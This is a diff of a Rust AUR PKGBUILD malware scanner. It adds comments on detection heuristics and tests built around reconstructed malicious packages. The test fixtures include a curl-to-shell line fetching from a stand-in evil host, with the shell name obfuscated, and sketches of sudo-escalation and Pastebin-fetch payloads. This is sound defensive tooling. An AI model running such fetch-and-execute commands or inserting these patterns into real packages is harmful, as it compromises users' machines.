@@ -1,6 +1,9 @@
 //! AUR PKGBUILD safety scanner (pre-install tripwire; hit → ask before continue).
 //!
 //! Heuristics + 2026 campaigns: Atomic Arch (npm/bun infostealer),
+//! openconnect-sso (`sudo` + validator, Tor stage2), early-August
+//! (ELF as generic build tool). See sudo_escalation_line, onion_address_line,
+//! decoy_tool_binary_line, KNOWN_COMPROMISED_AUR_PACKAGES, KNOWN_MALICIOUS_SHA256.
 
 use crate::theme::Themed;
 use colored::Colorize;
@@ -628,7 +631,13 @@ pub(crate) fn line_of_decoy_tool_binary(source: &str) -> Option<usize> {
 /// Anti-sandbox / anti-debugger fingerprinting: checking `TracerPid` in
 /// `/proc/self/status`, or probing whether `LD_PRELOAD`/`LD_LIBRARY_PATH`
 /// are set, is how malware checks whether it's being watched (a
-
+/// debugger, strace, or a sandbox like ours) before deciding whether to
+/// misbehave. Not tied to a specific disclosed campaign, so Suspicious.
+///
+/// FP note: legitimate builds sometimes *export* these vars for their
+/// own linking needs (`export` lines are excluded). `/proc/self/status`
+/// and `TracerPid` have no legitimate PKGBUILD use, so a bare reference
+/// is enough on its own.
 pub(crate) fn sandbox_evasion_line(line: &str) -> bool {
     let l = line.trim();
     if l.starts_with('#') {
@@ -666,7 +675,10 @@ pub(crate) fn line_of_sandbox_evasion(source: &str) -> Option<usize> {
 /// npm/bun/yarn flags confirmed to take a value (so e.g. `--cache
 /// "$srcdir/npm-cache"` isn't mistaken for installing a package named
 /// after the cache path). Only add a flag here once verified -- an
-
+/// unverified *boolean* flag added by mistake would let a malicious
+/// PKGBUILD hide a real package behind it (`npm install --foo evil-pkg`
+/// skips `evil-pkg` as `--foo`'s "value" while real npm still installs
+/// it). Missing a real value-taking flag just means an extra prompt.
 const NPM_VALUE_TAKING_FLAGS: &[&str] = &["--cache", "--registry", "--prefix", "--tag"];
 
 /// Same idea, pip's own documented value-taking flags.
@@ -685,7 +697,8 @@ const PIP_VALUE_TAKING_FLAGS: &[&str] = &[
 /// npm/bun/pip install of a named external package (Atomic Arch pattern).
 /// Bare `npm ci`/`npm install` (no package arg, just flags) is fine --
 /// that installs from an existing package.json/requirements.txt, the
-
+/// normal way a JS/Python project pulls in its own declared
+/// dependencies mid-build. FP: legit global CLI installs - review only.
 pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
     // gem has no verified value-taking-flag list, so every `-`-prefixed
     // token there is (safely) assumed boolean.
@@ -1300,7 +1313,7 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
 /// Per-process memo so a pkgbase already scanned earlier in this run
 /// (main.rs's pre-check, `aur_install`'s pre-scan, and the per-pkgbase
 /// check in `resolve_and_build_aur` all call this) isn't re-fetched and
-
+/// re-prompted for the same unchanged finding.
 struct ScanMemo {
     fetched: std::collections::HashMap<String, FetchedSource>,
     confirmed: std::collections::HashSet<String>,
@@ -1626,7 +1639,10 @@ fn scan_report(
     // Same name-based check as scan_aur_pkgbuilds_or_abort - `--scan`/
     // `--install-pkgbuild --scan` are separate entry points from the
     // install-time path, so this needs its own copy rather than relying
-
+    // on the caller to have gone through that function first. `label` is
+    // the pkgbase for `scan_report_aur` and the local directory's name
+    // for `scan_report_local` - both are what the user is about to
+    // build, so it's the right thing to check either way.
     if let Some(finding) = known_compromised_package_finding(label) {
         pkg_findings.push(finding);
     }
@@ -1793,7 +1809,12 @@ pub(crate) fn print_finding_block(
 // ── Pre-`pacman -U` audit of a built `*.pkg.tar.*` ───────────────────────────
 //
 // The static PKGBUILD scanner cannot predict what `package()` will put
+// into the archive. Whatever ends up installed runs as root (`.INSTALL`
+// hooks, alpm hooks, udev rules, sudoers fragments, setuid binaries).
+// Cheap second pass over the finished tarball before the privileged
+// install step.
 
+/// Paths / modes that are worth stopping the user over before root install.
 const DANGEROUS_PKG_PATH_SUBSTR: &[&str] = &[
     "/usr/share/libalpm/hooks/",
     "/etc/pacman.d/hooks/",
@@ -1909,7 +1930,8 @@ fn extract_install_script(path: &std::path::Path) -> Option<String> {
 /// Audit every built tarball before `pacman -U`. Prints findings; when
 /// `force_prompt` is true (interactive ask paths) requires `y` to
 /// continue. With `--noconfirm` only warns and continues.
-
+///
+/// Returns `false` if the user declined.
 pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> bool {
     use std::io::{self, Write};
     use std::path::Path;
@@ -1925,6 +1947,7 @@ pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> b
             Ok(findings) if findings.is_empty() => {}
             Ok(findings) => {
                 any = true;
+                crate::progress::status_break();
                 eprintln!();
                 eprintln!(
                     "{} package archive audit: {}",
@@ -1971,6 +1994,7 @@ pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> b
         );
         return true;
     }
+    crate::progress::status_break();
     eprint!(
         "{} Built package contains privileged paths/scripts. Continue with pacman -U? [y/N] ",
         ">>>".t_yellow().bold()
@@ -1984,6 +2008,7 @@ pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> b
         );
         return false;
     }
+    crate::progress::status_resume();
     true
 }
 
@@ -2127,7 +2152,7 @@ package() {
         // the real repro: a markdown code-span backtick left in pkgdesc,
         // pasted from a GitHub README - runs the literal command `bwrap`
         // (no args) the instant anything sources this PKGBUILD, before
-
+        // build() or the sandbox are anywhere in the picture.
         let pkgbuild = "pkgname=aura-emerge\npkgver=2.1.4\npkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgrel=1\n";
         let findings = scan_pkgbuild_source(pkgbuild);
         assert!(findings
@@ -2279,7 +2304,7 @@ package() {
         // `--scan`/`--install-pkgbuild --scan` go through `scan_report`,
         // a separate entry point from the install-time
         // `scan_aur_pkgbuilds_or_abort` - make sure the name check fires
-
+        // there too, on a totally clean PKGBUILD body.
         let clean = "pkgname=archutil\npkgver=1.0\npkgrel=1\nbuild() {\n  make\n}\n";
         assert!(!scan_report("archutil", clean, None, None));
         assert!(scan_report("firefox", clean, None, None));
@@ -2345,7 +2370,8 @@ package() {
         // the real repro: an inline comment on the install= line (even one
         // that re-mentions ${pkgname}, as a copy-pasted note might) used to
         // get glued onto the value, producing a filename that could never
-
+        // exist on disk - the .install hook then silently never got read
+        // or scanned, with no error anywhere.
         assert_eq!(
             parse_install_filename("install=foo.install   # some comment"),
             Some("foo.install".to_string())
@@ -2490,6 +2516,12 @@ build() {
     // ── 2018 acroread/balz/minergate takeover ───────────────────────────
     //
     // Real incident: a hijacked orphaned AUR package fetched a persistence
+    // script from a Pastebin raw URL and, once run, dropped a literal
+    // `compromised.txt` marker into every home directory. Covered here by
+    // two independent heuristics: the paste-site fetch (Suspicious, since
+    // the mechanism alone has some legitimate uses) and the marker
+    // filename itself (ConfirmedIoc, since there's no legitimate reason
+    // for a PKGBUILD to reference it at all).
 
     #[test]
     fn paste_site_fetch_detected() {
@@ -2527,7 +2559,8 @@ build() {
         // Reconstructed shape of the real 2018 payload: fetch a script off
         // Pastebin and pipe it into the shell, which then drops the marker
         // file. Should trip curl-pipe-shell (Suspicious), paste-site-fetch
-
+        // (Suspicious), and - since the marker also happens to appear in
+        // this build() - the exact-IOC check (ConfirmedIoc).
         let src = r#"
 pkgname=acroread
 build() {
@@ -2553,6 +2586,9 @@ build() {
     // ── Jul/Aug 2026 openconnect-sso-anchored wave ──────────────────────
     //
     // Reported mechanism: a compromised package's build path added a
+    // binary named `validator` and executed it with `sudo` during
+    // packaging, reusing Tor-backed second-stage delivery from the June
+    // 2026 Atomic Arch campaign.
 
     #[test]
     fn sudo_escalation_detected() {
@@ -2601,7 +2637,8 @@ build() {
         // Reconstructed shape of the reported incident: an adopted
         // package's build() gains a bundled `validator` binary and runs
         // it with sudo. Should trip the sudo-escalation heuristic
-
+        // (Suspicious) - no ConfirmedIoc here since the binary name alone
+        // isn't a matchable exact indicator, only the behavior is.
         let pkgbuild = r#"
 pkgname=openconnect-sso
 pkgver=0.13.0
@@ -2758,7 +2795,7 @@ build() {
         // Same shape as atomic_arch_style_pkgbuild_and_install_flagged above,
         // but with the realistic ${pkgname}.install form instead of the
         // literal name - this is the case that used to silently skip the
-
+        // install hook entirely.
         let pkgbuild = r#"
 pkgname=totally-legit-tool
 pkgver=1.2.3
@@ -2781,7 +2818,8 @@ build() {
         // `s""h` is bash string concatenation for the literal shell name
         // "sh" at runtime, but no single token in the source text equals
         // "sh" for a naive line-based grep to match. The AST path (tried
-
+        // first in scan_pkgbuild_source) resolves the concatenation and
+        // still catches it.
         let src = "curl -sSL https://evil.example.com/x | s\"\"h\n";
         let findings = scan_pkgbuild_source(src);
         assert!(findings
